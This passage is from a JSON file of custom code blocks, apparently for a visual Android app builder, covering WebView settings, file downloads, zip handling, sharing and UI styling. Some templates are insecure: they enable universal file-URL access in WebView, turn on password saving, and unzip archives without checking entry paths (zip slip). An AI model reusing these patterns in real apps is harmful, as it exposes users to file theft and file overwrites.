WebView","typeName":"","palette":"124","type":" ","spec":"Set java script mode in %m.webview as %b"},{"code":"%s.getSettings().setSavePassword(%s);","color":"#FF03A9F4","name":"WebView Password Save Mode","typeName":"","palette":"124","type":" ","spec":"set %m.webview passwords save mode as %b"},{"code":"WebSettings webSettings \u003d %s.getSettings(); \nwebSettings.setJavaScriptEnabled(true); \nwebSettings.setJavaScriptCanOpenWindowsAutomatically(true);\nif (android.os.Build.VERSION.SDK_INT \u003e\u003d android.os.Build.VERSION_CODES.JELLY_BEAN) {\nwebSettings.setAllowFileAccessFromFileURLs(true); \nwebSettings.setAllowUniversalAccessFromFileURLs(true);\n}","color":"#FF03A9F4","name":"Support Html In WerView","typeName":"","palette":"124","type":" ","spec":"Set Html Suppport into %m.webview"},{"code":"%1$s.setDownloadListener(new DownloadListener() {\npublic void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {\nDownloadManager.Request request \u003d new DownloadManager.Request(Uri.parse(url));\nString cookies \u003d CookieManager.getInstance().getCookie(url);\nrequest.addRequestHeader(\"cookie\", cookies);\nrequest.addRequestHeader(\"User-Agent\", userAgent);\nrequest.setDescription(\"Downloading file...\");\nrequest.setTitle(URLUtil.guessFileName(url, contentDisposition, mimetype));\nrequest.allowScanningByMediaScanner(); request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);\njava.io.File aatv \u003d new java.io.File(Environment.getExternalStorageDirectory().getPath() + \"/%2$s\");\nif(!aatv.exists()){if (!aatv.mkdirs()){ Log.e(\"TravellerLog ::\",\"Problem creating Image folder\");}} request.setDestinationInExternalPublicDir(\"/%2$s\", URLUtil.guessFileName(url, contentDisposition, mimetype));\nDownloadManager manager \u003d (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);\nmanager.enqueue(request);\nshowMessage(\"Downloading File....\");\n//Notif if success\nBroadcastReceiver onComplete \u003d new BroadcastReceiver() {\npublic void onReceive(Context ctxt, Intent intent) {\nshowMessage(\"Download Complete!\");\nunregisterReceiver(this);\n}};\nregisterReceiver(onComplete, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));\n}\n});","name":"Download In app With Notification","palette":"124","type":" ","spec":"%m.webview Download In App On Storage Path /%s.inputOnly"},{"code":"%1$s.setDownloadListener(new DownloadListener() {\npublic void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {\nIntent intent \u003d new Intent(Intent.ACTION_VIEW);\nintent.setData(Uri.parse(url));\nstartActivity (intent);\n}\n});","name":"Download With Other App","palette":"124","type":" ","spec":"%m.webview download With Other App"},{"code":"WebSettings webSettings \u003d %1$s.getSettings(); \nwebSettings.setTextZoom((int)%2$s); ","color":"#FF03A9F4","name":"webview text size","typeName":"","palette":"124","type":" ","spec":"%m.webview set text size %d"},{"code":"startActivity(new android.content.Intent(android.app.DownloadManager.ACTION_VIEW_DOWNLOADS));","name":"Open Download Folder","palette":"124","type":" ","spec":"Open Download Folder"},{"code":"%1$s.getSettings().setAppCacheMaxSize(5*1024*1024);\n%1$s.getSettings().setAppCachePath(getApplicationContext().getCacheDir().getAbsolutePath());\n%1$s.getSettings().setAllowFileAccess(true);\n%1$s.getSettings().setAppCacheEnabled(true);\nwebview1.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);\n%1$s.getSettings().setLoadWithOverviewMode(true);\n%1$s.getSettings().setUseWideViewPort(true);\n%1$s.getSettings().setLayoutAlgorithm(WebSettings.LayoutAlgorithm.SINGLE_COLUMN);\n%1$s.getSettings().setDomStorageEnabled(true);\n%1$s.getSettings().setSaveFormData(true);","color":"#FF03A9F4","name":"Increase Speed","typeName":"","palette":"124","type":" ","spec":"%m.webview increase speed"},{"code":"final android.widget.ProgressBar prog \u003d new android.widget.ProgressBar(this,null, android.R.attr.progressBarStyleHorizontal);\nprog.setPadding(0,0,0,0);\nprog.setIndeterminate(false);\nprog.setFitsSystemWindows(true);\nprog.setProgress(0);\nprog.setScrollBarStyle(android.widget.ProgressBar.SCROLLBARS_OUTSIDE_INSET);\nprog.setMax(100);\nViewGroup.LayoutParams vlp \u003d new ViewGroup.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);\nprog.setLayoutParams(vlp);\n%2$s.addView(prog);\n%1$s.setWebChromeClient(new WebChromeClient() {\n@Override public void onProgressChanged(WebView view, int newProgress) {\nprog.setProgress(newProgress);\n}\n});","color":"#FF03A9F4","name":"loading progress get","typeName":"","palette":"124","type":" ","spec":"%m.webview get progress at %m.view"},{"code":"%1$s.setWebViewClient(new WebViewClient() { \n\npublic void onReceivedError(WebView webview, int errorCode, String description, String failingUrl) {\n\n%2$s\n\n} });","color":"#FF03A9F4","name":"webview loading failed","typeName":"","palette":"124","type":"c","spec":"%m.webview on loading failed"},{"code":"%1$s.setDownloadListener(new DownloadListener() {\npublic void onDownloadStart(String url, String userAgent,  String contentDisposition, String mimetype,                 long contentLength) {    \n\n%2$s\n   \n } });","color":"#FF03A9F4","name":"when webview download","typeName":"","palette":"124","type":"c","spec":"when %m.webview download a file"},{"code":"%1$s.getSettings().setLoadWithOverviewMode(true); %1$s.getSettings().setUseWideViewPort(true); final WebSettings webSettings \u003d %1$s.getSettings(); final String newUserAgent; newUserAgent \u003d \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\"; webSettings.setUserAgentString(newUserAgent);","name":"WebView Set Desktop Mode","palette":"124","type":" ","spec":"%m.webview Set desktop Mode"},{"code":"%1$s.getSettings().setLoadWithOverviewMode(true); %1$s.getSettings().setUseWideViewPort(true); final WebSettings webSettings \u003d %1$s.getSettings(); final String newUserAgent; newUserAgent \u003d \"Mozilla/5.0 (Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\"; webSettings.setUserAgentString(newUserAgent);","name":"WebView Set Mobile","palette":"124","type":" ","spec":"%m.webview Set Mobile View"},{"code":"%1$s.setWebViewClient(new WebViewClient());","name":"webview get Client","palette":"124","type":" ","spec":"%m.webview Enable Web Client"},{"code":"%1$s.getSettings().setLoadWithOverviewMode(%2$s);","name":"webview Load with Overview","palette":"124","type":" ","spec":"%m.webview Load With OverView%b"},{"code":"%1$s.getSettings().setUseWideViewPort(%2$s);","name":"webview set wideVuew Port","palette":"124","type":" ","spec":"%m.webview Wide ViewPort %b"},{"code":"%1$s.getSettings().setDisplayZoomControls(%2$s);","name":"Zoom With button","palette":"124","type":" ","spec":"%m.webview zoom with Button %b"},{"code":"%1$s.getSettings().setBuiltInZoomControls(%2$s);","name":"zoom with Finger","palette":"124","type":" ","spec":"%m.webview zoom with Finger %b"},{"code":"%1$s.setImageBitmap(%2$s.getFavicon());","name":"set Favicon","palette":"124","type":" ","spec":"%m.imageview set Image View To Favicon%m.webview"},{"code":"%1$s.getSettings().setJavaScriptCanOpenWindowsAutomatically(%2$s);","name":"JavaScript Can Open Window","palette":"124","type":" ","spec":"%m.webview Can Open WindowAutomatically%b"},{"code":"new AdBlockerWebView.init(%1$s.this).initializeWebView(%2$s);","name":"AdBlockWebview.init","palette":"124","type":" ","spec":"AdBlockerWebView at %m.activity for %m.webview"},{"code":"%1$s.setWebViewClient(new %1$S_Client());","name":"WebViewSetClientAdBlock","palette":"124","type":" ","spec":"%m.webview setClientAdBlocker"},{"code":"try {\n\tjava.util.zip.ZipOutputStream os \u003d new java.util.zip.ZipOutputStream(new java.io.FileOutputStream(\"%2$s/%3$s\"));\n\t\t\tzip(os, \"%1$s\", null);\n\t\t\tos.close();\n}\n\ncatch(java.io.IOException e) {}\r\n}\r\nprivate void zip(java.util.zip.ZipOutputStream os, String filePath, String name) throws java.io.IOException\n\t{\n\t\tjava.io.File file \u003d new java.io.File(filePath);\n\t\tjava.util.zip.ZipEntry entry \u003d new java.util.zip.ZipEntry((name !\u003d null ? name + java.io.File.separator : \"\") + file.getName() + (file.isDirectory() ? java.io.File.separator : \"\"));\n\t\tos.putNextEntry(entry);\n\t\t\n\t\tif(file.isFile()) {\n\t\t\t\tjava.io.InputStream is \u003d new java.io.FileInputStream(file);\n\t\t\t\tint size \u003d is.available();\n\t\t\t\tbyte[] buff \u003d new byte[size];\n\t\t\t\tint len \u003d is.read(buff);\n\t\t\t\tos.write(buff, 0, len);\n\t\t\t\treturn;\n\t\t}\n\t\t\n\t\tjava.io.File[] fileArr \u003d file.listFiles();\n\t\tfor(java.io.File subFile : fileArr) {\n\t\t\t\tzip(os, subFile.getAbsolutePath(), entry.getName());\n\t\t}","color":"#FF0097A7","name":"Zip","typeName":"","palette":"125","type":" ","spec":"Zip path %s.inputOnly  to path %s.inputOnly with file name %s.inputOnly "},{"code":"try\r\n{\r\n\tjava.io.File outdir \u003d new java.io.File(%2$s);\r\n\tjava.util.zip.ZipInputStream zin \u003d new java.util.zip.ZipInputStream(new java.io.FileInputStream(%1$s));\r\n\tjava.util.zip.ZipEntry entry;\r\n\tString name, dir;\r\n\twhile ((entry \u003d zin.getNextEntry()) !\u003d null)\r\n\t{\r\n\t\tname \u003d entry.getName();\r\n\t\tif(entry.isDirectory())\r\n\t\t{\r\n\t\t\tmkdirs(outdir, name);\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\t\r\n\t\t/* this part is necessary because file entry can come before\r\n* directory entry where is file located\r\n* i.e.:\r\n* /foo/foo.txt\r\n* /foo/\r\n*/\r\n\t\t\r\n\t\tdir \u003d dirpart(name);\r\n\t\tif(dir !\u003d null)\r\n\t\tmkdirs(outdir, dir);\r\n\t\t\r\n\t\textractFile(zin, outdir, name);\r\n\t}\r\n\tzin.close();\r\n}\r\ncatch (java.io.IOException e)\r\n{\r\n\te.printStackTrace();\r\n}\r\n}\r\nprivate static void extractFile(java.util.zip.ZipInputStream in, java.io.File outdir, String name) throws java.io.IOException\r\n{\r\nbyte[] buffer \u003d new byte[4096];\r\njava.io.BufferedOutputStream out \u003d new java.io.BufferedOutputStream(new java.io.FileOutputStream(new java.io.File(outdir, name)));\r\nint count \u003d -1;\r\nwhile ((count \u003d in.read(buffer)) !\u003d -1)\r\nout.write(buffer, 0, count);\r\nout.close();\r\n}\r\n\r\nprivate static void mkdirs(java.io.File outdir, String path)\r\n{\r\njava.io.File d \u003d new java.io.File(outdir, path);\r\nif(!d.exists())\r\nd.mkdirs();\r\n}\r\n\r\nprivate static String dirpart(String name)\r\n{\r\nint s \u003d name.lastIndexOf(java.io.File.separatorChar);\r\nreturn s \u003d\u003d -1 ? null : name.substring(0, s);","color":"#FF0097A7","name":"Unzip","typeName":"","palette":"125","type":" ","spec":"Unzip file from path %s.inputOnly to path %s.inputOnly "},{"code":"","color":"#FF009688","name":"webview tools","typeName":"","palette":"126","type":"h","spec":"Webview Additional blocks by Nethical Tech"},{"code":"%1$s.getTitle()","color":"#FF009688","name":"get title","typeName":"","palette":"126","type":"s","spec":"%m.webview get title "},{"code":"%1$s.setImageBitmap(%2$s.getFavicon());","color":"#FF009688","name":"set fab icon","typeName":"","palette":"126","type":" ","spec":"%m.imageview   set website logo from %m.webview"},{"code":"if (!%1$s.getText().toString().contains(\".\")) {\r\n\t%2$s.loadUrl(\"http://www.google.co.in/search?q\u003d\".concat(%1$s.getText().toString()));\r\n}\r\nelse {\r\n\tif (%1$s.getText().toString().contains(\"http://\")) {\r\n\t\t%2$s.loadUrl(%1$s.getText().toString());\r\n\t}\r\n\telse {\r\n\t\tif (%1$s.getText().toString().contains(\"https://\")) {\r\n\t\t\t%2$s.loadUrl(%1$s.getText().toString());\r\n\t\t}\r\n\t\telse {\r\n\t\t\t%2$s.loadUrl(\"http://\".concat(%1$s.getText().toString()));\r\n\t\t}\r\n\t}\r\n}","color":"#FF009688","name":"search ","typeName":"","palette":"126","type":" ","spec":"Search google  %m.edittext  with %m.webview  "},{"code":"%1$s.getSettings().setJavaScriptEnabled(true); %1$s.setWebViewClient(new WebViewClient()); registerForContextMenu(%1$s);","color":"#FF009688","name":"java","typeName":"","palette":"126","type":" ","spec":"Enable javascript on %m.webview "},{"code":"((EditText)findViewById(R.id.%1$s)).setOnEditorActionListener( new EditText.OnEditorActionListener() { @Override public boolean onEditorAction(TextView v, int actionId, KeyEvent event) { // Identifier of the action. This will be either the identifier you supplied, // or EditorInfo.IME_NULL if being called due to the enter key being pressed. if (actionId \u003d\u003d EditorInfo.IME_ACTION_SEARCH || actionId \u003d\u003d EditorInfo.IME_ACTION_DONE || event.getAction() \u003d\u003d KeyEvent.ACTION_DOWN \u0026\u0026 event.getKeyCode() \u003d\u003d KeyEvent.KEYCODE_ENTER) { onSearchAction(v); return true; } // Return true if you have consumed the action, else false.\nif (!%1$s.getText().toString().contains(\".\")) {\r\n\t%2$s.loadUrl(\"http://www.google.co.in/search?q\u003d\".concat(%1$s.getText().toString()));\r\n}\r\nelse {\r\n\tif (%1$s.getText().toString().contains(\"http://\")) {\r\n\t\t%2$s.loadUrl(%1$s.getText().toString());\r\n\t}\r\n\telse {\r\n\t\tif (%1$s.getText().toString().contains(\"https://\")) {\r\n\t\t\t%2$s.loadUrl(%1$s.getText().toString());\r\n\t\t}\r\n\t\telse {\r\n\t\t\t%2$s.loadUrl(\"http://\".concat(%1$s.getText().toString()));\r\n\t\t}\r\n\t}\r\n}\r\n\t\treturn false; } });","color":"#FF009688","name":"ime","typeName":"","palette":"126","type":" ","spec":"search on %m.edittext  ime clicked %m.webview"},{"code":"%1$s.setSingleLine(true);","color":"#FF009688","name":"singleline","typeName":"","palette":"126","type":" ","spec":"%m.edittext  enable single line for edittext ime"},{"code":"%s.setDownloadListener(new DownloadListener() {\n\t\t\t@Override public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimeType, long contentLength) { \n\t\t\tDownloadManager.Request request \u003d new DownloadManager.Request( Uri.parse(url));\n\t\t\trequest.setMimeType(mimeType); String cookies \u003d CookieManager.getInstance().getCookie(url);\n\t\t\trequest.addRequestHeader(\"cookie\", cookies); \n\t\t\trequest.addRequestHeader(\"User-Agent\", userAgent);\n\t\t\trequest.setDescription(\"Downloading file...\"); \n\t\t\trequest.setTitle(URLUtil.guessFileName(url, contentDisposition, mimeType)); \n\t\t\trequest.allowScanningByMediaScanner();\n\t\t\trequest.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);\n\t\t\trequest.setDestinationInExternalPublicDir( Environment.DIRECTORY_DOWNLOADS, URLUtil.guessFileName( url, contentDisposition, mimeType));\n\t\t\tDownloadManager dm \u003d (DownloadManager) getSystemService(DOWNLOAD_SERVICE);\n\t\t\tdm.enqueue(request); \n\t\t\t\n\t\t\t%s\n\t\t\t\n\t\t\t}});","color":"#FF009688","name":"enable dowoads","typeName":"","palette":"126","type":"c","spec":"%m.webview Enable Downloadimg"},{"code":"%1$s.loadUrl(%1$s.getUrl());","color":"#FF009688","name":"refresh","typeName":"","palette":"126","type":" ","spec":"refresh  website %m.webview "},{"code":"%1$s.getSettings().setLoadWithOverviewMode(true); %1$s.getSettings().setUseWideViewPort(true); final WebSettings webSettings \u003d webview1.getSettings(); final String newUserAgent; newUserAgent \u003d \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\"; webSettings.setUserAgentString(newUserAgent);","color":"#FF009688","name":"desktop","typeName":"","palette":"126","type":" ","spec":"open in desktop mode %m.webview "},{"code":"%1$s.loadUrl(\"file://\".concat(%s));","color":"#FF009688","name":"local","typeName":"","palette":"126","type":" ","spec":"open local file in %m.webview file path %s "},{"code":"Intent sharingIntent \u003d new Intent(Intent.ACTION_SEND); sharingIntent.setType(\"text/html\"); sharingIntent.putExtra(android.content.Intent.EXTRA_TEXT, Html.fromHtml(%s)); startActivity(Intent.createChooser(sharingIntent,\"Share using\"));","color":"#FF009688","name":"share website","typeName":"","palette":"126","type":" ","spec":"share text %s "},{"code":"%1$s.getSettings().setBuiltInZoomControls(true);","color":"#FF009688","name":"pinch zoom","typeName":"","palette":"126","type":" ","spec":"enable pinch zoom %m.webview "},{"code":"final androidx.swiperefreshlayout.widget.SwipeRefreshLayout\n sr \u003d new androidx.swiperefreshlayout.widget.SwipeRefreshLayout\n(this); sr.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.MATCH_PARENT));\n%2$s.addView(sr); final WebView wb \u003d (WebView)findViewById(R.id.%1$s); wb.getSettings().setJavaScriptEnabled(true); %2$s.removeView(wb); %2$s.post(new Runnable() { @Override public void run() { sr.addView(wb); } }); wb.setWebViewClient(new WebViewClient() { public void onPageFinished(WebView view, String url) { sr.setRefreshing(false); }}); sr.setOnRefreshListener( new androidx.swiperefreshlayout.widget.SwipeRefreshLayout\n.OnRefreshListener() { @Override public void onRefresh() { wb.reload(); } } );","color":"#FF009688","name":"swipe","typeName":"","palette":"126","type":" ","spec":"swipe refresh %m.webview above %m.view"},{"code":"CookieManager.getInstance().setAcceptCookie(true);","color":"#FF009688","name":"cookies","typeName":"","palette":"126","type":" ","spec":"webview accept cookies"},{"code":"","color":"#FF009688","name":"others","typeName":"","palette":"126","type":"h","spec":"others"},{"code":"nr \u003d 0;\r\nfor(int _repeat15 \u003d 0; _repeat15 \u003c (int)(%1$s.size()); _repeat15++) {\r\n\t{\r\n\t\tHashMap\u003cString, Object\u003e _item \u003d new HashMap\u003c\u003e();\r\n\t\t_item.put(%s, %1s.get((int)(nr)));\r\n\t\t%2s.add(_item);\r\n\t}\r\n\t\r\n\tnr++;\r\n}","color":"#FF009688","name":"","typeName":"","palette":"126","type":" ","spec":"%m.listStr  to %m.listMap   Key %s "},{"code":"try {\nString mobile \u003d %s; String\n//type your message in quotation\nmsg \u003d %2$s; startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"https://api.whatsapp.com/send?phone\u003d\" + mobile + \"\u0026text\u003d\" + msg))); }catch (Exception e){ //whatsapp app not install }}","color":"#FF009688","name":"send","typeName":"","palette":"126","type":" ","spec":"send whatsapp message number %s  message %s "},{"code":"Intent mailIntent \u003d new Intent(Intent.ACTION_VIEW); Uri data \u003d Uri.parse(\"mailto:?subject\u003d\" + %1$s+ \"\u0026body\u003d\" + %2$ss + \"\u0026to\u003d\" + %3$s); mailIntent.setData(data); startActivity(Intent.createChooser(mailIntent, \"Send mail...\"));","color":"#FF009688","name":"email","typeName":"","palette":"126","type":" ","spec":"Send email: subject %s , body %s ,   To emal address %s"},{"code":"setRequestedOrientation(android.content.pm.ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);","color":"#FF009688","name":"rotate landscape","typeName":"","palette":"126","type":" ","spec":"Rotate activity to landscape "},{"code":"setRequestedOrientation(android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);","color":"#FF009688","name":"roatate portrait","typeName":"","palette":"126","type":" ","spec":"rotate activity to portrait"},{"code":"%1$s.setTarget(%2$s);\r\n%1$s.setPropertyName(\"alpha\");\r\n%1$s.setFloatValues((float)(0), (float)(1));\r\n%1$s.setDuration((int)(%3$s));\r\n%1$s.setInterpolator(new LinearInterpolator());\r\n%1$s.start();","color":"#FF009688","name":"fadein","typeName":"","palette":"126","type":" ","spec":"%m.objectanimator FadeIn Animation on %m.view duration %d "},{"code":"%1$s.setTarget(%2$s);\r\n%1$s.setPropertyName(\"alpha\");\r\n%1$s.setFloatValues((float)(1), (float)(0));\r\n%1$s.setDuration((int)(%3$s));\r\n%1$s.setInterpolator(new LinearInterpolator());\r\n%1$s.start();","color":"#FF009688","name":"fadeout","typeName":"","palette":"126","type":" ","spec":"%m.objectanimator FadeOut Animation on %m.view  duration %d "},{"code":"if (android.os.Build.VERSION.SDK_INT \u003e\u003d 21) {\n\n%1$s.getIndeterminateDrawable().setColorFilter(Color.parseColor(%2$s), PorterDuff.Mode.SRC_IN);\n\n}","color":"#FF009688","name":"color","typeName":"","palette":"126","type":" ","spec":"Set Progressbar %m.progressbar Color  %s.inputOnly "},{"code":"ScaleAnimation scaleAnimation \u003d new ScaleAnimation(1f,4f,1f,4f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, -1.5f); \nscaleAnimation.setInterpolator(new LinearInterpolator()); \nscaleAnimation.setDuration((int)%2$s); \n%1$s.startAnimation(scaleAnimation);","color":"#FF009688","name":"zoomanim","typeName":"","palette":"126","type":" ","spec":"zooming animation on %m.textview  duration %d  "},{"code":"audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, %1$s, 0);","color":"#FF009688","name":"audio","typeName":"","palette":"126","type":" ","spec":"Set Audio Volume to %d "},{"code":"audioManager \u003d (AudioManager) getSystemService(Context.AUDIO_SERVICE); %1$s.setMax(audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC));\n\n}\n\nAudioManager audioManager;\n\nprivate void nothing() {","color":"#FF009688","name":"seekbar","typeName":"","palette":"126","type":" ","spec":"set Max Audio Volume number %m.seekbar"},{"code":"%1$s.setText(Build.VERSION.RELEASE);","color":"#FF009688","name":"get android","typeName":"","palette":"126","type":" ","spec":"%m.textview set text to current android version "},{"code":"%1$s.setText(Build.MANUFACTURER.concat(\" \".concat(Build.MODEL)));","color":"#FF009688","name":"model","typeName":"","palette":"126","type":" ","spec":"set text %m.textview   to current build model"},{"code":"%1$s.getIndeterminateDrawable().setColorFilter(Color.parseColor(%2$s), PorterDuff.Mode.SRC_IN);","color":"#FF009688","name":"code","typeName":"","palette":"126","type":" ","spec":"set  %m.seekbar color %s.inputOnly  "},{"code":"String apk \u003d %s;\nString uri \u003d (%s);\n\ntry {\n\tandroid.content.pm.PackageInfo pi \u003d getPackageManager().getPackageInfo(uri, android.content.pm.PackageManager.GET_ACTIVITIES);\n\t\n\tapk \u003d pi.applicationInfo.publicSourceDir;\n} catch (Exception e) {\n\tshowMessage(e.toString());\n}\nIntent iten \u003d new Intent(Intent.ACTION_SEND);\niten.setType(\"*/*\");\niten.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new java.io.File(apk)));\n\nstartActivity(Intent.createChooser(iten, %s));","color":"#FF03A9F4","name":"ShareApp","typeName":"","palette":"-1","type":" ","spec":"Share App as file with name (must add .apk For example App.apk) And with package name %s with message %s"},{"code":"Intent i \u003d new Intent(android.content.Intent.ACTION_SEND); i.setType(\"text/plain\"); i.putExtra(android.content.Intent.EXTRA_TEXT, %s); startActivity(Intent.createChooser(i,%s));","color":"#FF03A9F4","name":"Share Text","typeName":"","palette":"-1","type":" ","spec":"Share The text ( %s ) with message %s"},{"code":"Bitmap bm \u003d ((android.graphics.drawable.BitmapDrawable) %s.getDrawable()).getBitmap(); try { java.io.File file \u003d new java.io.File(getExternalCacheDir() + \"/image.jpg\"); java.io.OutputStream out \u003d new java.io.FileOutputStream(file); bm.compress(Bitmap.CompressFormat.JPEG, 100, out); out.flush(); out.close(); } catch (Exception e) { showMessage(e.toString()); } Intent iten \u003d new Intent(android.content.Intent.ACTION_SEND); iten.setType(\"*/*\"); iten.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new java.io.File(getExternalCacheDir() + \"/image.jpg\"))); startActivity(Intent.createChooser(iten, \"Send image\"));","color":"#FF03A9F4","name":"ShareImage","typeName":"","palette":"-1","type":" ","spec":"Share %m.imageview"},{"code":"}\nprivate class %1$S_Client extends WebViewClient {\n\n        %1$S_Client() {}\n\n        @SuppressWarnings(\"deprecation\")\n        @Override\n        public WebResourceResponse shouldInterceptRequest(WebView view, String url) {\n\n            return AdBlockerWebView.blockAds(view,url) ? com.monstertechno.adblocker.util.AdBlocker.createEmptyResource() :\n                    super.shouldInterceptRequest(view, url);\n\n        }\n\n        @Override\n        public void onPageStarted(WebView view, String url, Bitmap favicon) {\n            super.onPageStarted(view, url, favicon);\n        }\n\n        @Override\n        public void onPageFinished(WebView view, String url) {\n            %2$s\n            super.onPageFinished(view, url);\n        }\n\n    }\n\n{","name":"ClassAdBlockerClient","palette":"124","type":"c","spec":"Class AdBlockerClient for %m.webview onPageFinished"},{"code":"","color":"#FF8BC34A","name":"","typeName":"","palette":"-1","type":"h","spec":"Added by Arab Ware team By Ameer Ezit تمت اضافتها بواسطة فريق عرب وير بواسطة امير عزت"},{"code":"","color":"#FFF44336","name":"","typeName":"","palette":"123","type":"h","spec":"Added by Arab Ware team By Ameer Ezit تمت اضافتها بواسطة فريق عرب وير بواسطة امير عزت"},{"code":"","color":"#FF2196F3","name":"","typeName":"","palette":"122","type":"h","spec":"Added by Arab Ware team By Ameer Ezit تمت اضافتها بواسطة فريق عرب وير بواسطة امير عزت"},{"code":"","color":"#FF8BC34A","name":"","typeName":"","palette":"120","type":"h","spec":"Added by Arab Ware team By Ameer Ezit تمت اضافتها بواسطة فريق عرب وير بواسطة امير عزت"},{"code":"Collections.sort(%1$s, String.CASE_INSENSITIVE_ORDER);","color":"#FFC62828","name":"listview sort","typeName":"","palette":"119","type":" ","spec":"sort %m.listview"},{"code":"_drawer_%1$s.setBackgroundColor(%2$s);","color":"#FF2196F3","name":"Drawer setWidgetColor","typeName":"","palette":"113","type":" ","spec":"Drawer Widget ID %s.inputOnly setBackgroundColor %m.color"},{"code":"_drawer_%1$s.setOnClickListener(new View.OnClickListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onClick(View _view) {\r\n\t\t\t\t%2$s\r\n\t\t\t}\r\n\t\t});","color":"#FF039BE5","name":"drawer on item clicked","typeName":"","palette":"113","type":"c","spec":"set on item %s.inputOnly  clicked then"},{"code":"_drawer_%s.setElevation((int)%s);","color":"#FF2196F3","name":"Drawer Widget setElevation","typeName":"","palette":"113","type":" ","spec":"Drawer Widget ID %s.inputOnly setElevation %d"},{"code":"_drawer_%1$s.setText(%2$s);","color":"#FF2196F3","name":"Drawer setText","typeName":"","palette":"113","type":" ","spec":"Drawer TextView ID %s.inputOnly setText %s"},{"code":"_drawer_%1$s.setTextColor(%2$s);","color":"#FF2196F3","name":"Drawer setTextColor","typeName":"","palette":"113","type":" ","spec":"Drawer TextView ID %s.inputOnly setTextColor %m.color"},{"code":"_drawer_%1$s.setOnClickListener(new View.OnClickListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onClick(View _view) {\r\n\t\t\t\t%2$s\r\n\t\t\t}\r\n\t\t});","color":"#FF2196F3","name":"Drawer setOnClick","typeName":"","palette":"113","type":"c","spec":"Drawer When Widget ID %s.inputOnly Clicked"},{"code":"_drawer_%s.setOnLongClickListener(new View.OnLongClickListener() {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean onLongClick(View _view) {\n\t\t\t\t\t%s\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t});","color":"#FF2196F3","name":"Drawer setOnLongClick","typeName":"","palette":"113","type":"c","spec":"Drawer When Widget ID %s.inputOnly LongClicked"},{"code":"_drawer_%s.setOnTouchListener(new View.OnTouchListener(){\n@Override\npublic boolean onTouch(View _view, MotionEvent _motionEvent){\n%s\nreturn true;\n}\n});","color":"#FF2196F3","name":"Drawer setOnTouched","typeName":"","palette":"113","type":"c","spec":"Drawer When Widget ID %s.inputOnly Touched"},{"code":"_drawer_%1$s.setCornerRadius((int)%2$s);","color":"#FF2196F3","name":"Drawer setCornerRadius","typeName":"","palette":"113","type":" ","spec":"Drawer Widget ID %s.inputOnly setCornerRadius %d"},{"code":"_drawer_%s.setBackground(new android.graphics.drawable.GradientDrawable() { public android.graphics.drawable.GradientDrawable getIns(int a, int b, int c) { this.setStroke(a, b); this.setColor(c); return this; } }.getIns((int)%s, %s, %s));","color":"#FF2196F3","name":"Drawer setStroke","typeName":"","palette":"113","type":" ","spec":"Drawer Widget ID %s.inputOnly setStroke %d strokeColor %m.color bgColor %m.color"},{"code":"_drawer_%s.setBackground(new android.graphics.drawable.GradientDrawable(android.graphics.drawable.GradientDrawable.Orientation.BR_TL,new int[] {%s,%s}));","color":"#FF2196F3","name":"Drawer gradientColor","typeName":"","palette":"113","type":" ","spec":"Drawer Widget ID %s.inputOnly setGradientBackground %m.color to %m.color"},{"code":"%s.setFilters(new InputFilter[] {\n    new InputFilter.AllCaps() {\n        @Override\n        public CharSequence filter(CharSequence source, int start, int end, Spanned dest, int dstart, int dend) {\n            return String.valueOf(source).toLowerCase();\n        }\n    }\n});","color":"#FF0080FF","name":"","typeName":"","palette":"10","type":" ","spec":"%m.edittext  Set Lowercase"},{"code":"%s.setFilters(new InputFilter[]{new InputFilter.AllCaps()});","color":"#FF0080FF","name":"","typeName":"","palette":"10","type":" ","spec":"%m.edittext Set Uppercase"},{"code":"","color":"#FF00BCD4","name":"","typeName":"","palette":"116","type":"h","spec":"Added By Kurdish Team ( Amin , Muhammed)"},{"code":"try {\n    Intent intent \u003d new Intent(Intent.ACTION_VIEW, Uri.parse(\"%s\"));\n    startActivity(intent);\n} catch(Exception e) {\n    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"http://www.facebook.com/appetizerandroid\")));\n}","color":"#FF1092F4","name":"Facebook","typeName":"","palette":"116","type":" ","spec":"Intent Facebook URL %s.inputOnly "},{"code":"Uri uri \u003d Uri.parse(\"%s\"); Intent likeIng \u003d new Intent(Intent.ACTION_VIEW, uri); likeIng.setPackage(\"com.instagram.android\"); try { startActivity(likeIng); } catch (ActivityNotFoundException e) { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(\"https://t.me/sketchware_kurdish\"))); }","color":"#FFE91E63","name":"Instagram","typeName":"","palette":"116","type":" ","spec":"Intent Instagram URL %s.inputOnly "},{"code":"Uri uri \u003d Uri.parse(\"%s\"); Intent likeIng \u003d new Intent(Intent.ACTION_VIEW, 